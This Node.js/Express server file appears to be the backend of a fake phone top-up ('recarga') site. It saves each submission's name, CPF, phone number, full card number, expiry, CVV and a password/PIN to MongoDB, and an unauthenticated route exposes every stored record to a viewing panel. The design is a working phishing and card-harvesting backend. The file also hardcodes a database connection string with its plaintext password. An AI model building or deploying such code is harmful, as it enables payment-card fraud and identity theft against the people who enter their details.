const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONEXÃO COM O MONGODB (Senha: Dks10dks@)
// Usamos %40 no lugar do @ para o MongoDB não dar erro de login
mongoose.connect('mongodb+srv://mateus:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('✅ Conectado ao MongoDB Atlas!'))
  .catch(err => console.error('❌ Erro de conexão:', err));

// ESTRUTURA DOS DADOS (SCHEMA)
const RecargaSchema = new mongoose.Schema({
    operadora: String,
    nome: String,
    cpf: String,
    telefone: String,
    valor: String,
    cartao: String,
    data: String,
    cvv: String,
    senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// ROTA PARA RECEBER DADOS DO SITE
app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).send('OK');
    } catch (err) { res.status(500).send('Erro'); }
});

// ROTA PARA O PAINEL BUSCAR DADOS
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Servidor na porta ${PORT}`));